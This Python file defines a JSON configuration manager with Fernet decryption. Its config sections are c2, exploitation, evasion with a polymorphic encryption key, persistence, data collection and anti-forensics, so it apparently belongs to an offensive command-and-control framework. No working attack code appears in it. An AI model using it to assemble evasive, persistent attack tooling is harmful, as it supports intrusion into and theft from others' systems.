import json
import os
from cryptography.fernet import Fernet
from dataclasses import dataclass

@dataclass
class Config:
    framework: dict
    database: dict
    c2: dict
    exploitation: dict
    evasion: dict
    persistence: dict
    data_collection: dict
    antiforensics: dict

class ConfigManager:
    def __init__(self, config_file: str):
        self.config_file = config_file
        self.data = {}
        self._load_config()
        self._init_encryption()

    def _load_config(self):
        if not os.path.exists(self.config_file):
            raise FileNotFoundError(f"Config file {self.config_file} not found.")
        
        with open(self.config_file, 'r') as f:
            self.data = json.load(f)

    def _init_encryption(self):
        key_str = self.data.get('evasion', {}).get('polymorphic', {}).get('encryption_key')
        if key_str:
            # Simple base64 decode for key generation (in production use Fernet key generation)
            self.cipher = Fernet(key_str.encode())
        else:
            self.cipher = None

    def get(self, key: str, default=None):
        """Get nested dictionary value using dot notation."""
        keys = key.split('.')
        value = self.data
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
            else:
                return default
        return value

    def update(self, key: str, value):
        """Update nested dictionary value."""
        keys = key.split('.')
        d = self.data
        for k in keys[:-1]:
            d = d.setdefault(k, {})
        d[keys[-1]] = value
        
        # Persist changes
        with open(self.config_file, 'w') as f:
            json.dump(self.data, f, indent=2)

    def get_encrypted_string(self, key: str) -> str:
        """Retrieve and decrypt a string value."""
        plain_text = self.get(key)
        if plain_text and self.cipher:
            return self.cipher.decrypt(plain_text.encode()).decode()
        return plain_text

    def set(self, key, value):
        """Set configuration value"""
        keys = key.split('.')
        d = self.data
        for k in keys[:-1]:
            d = d.setdefault(k, {})
        d[keys[-1]] = value

    def save(self):
        """Save configuration to file"""
        with open(self.config_file, 'w') as f:
            json.dump(self.data, f, indent=2)
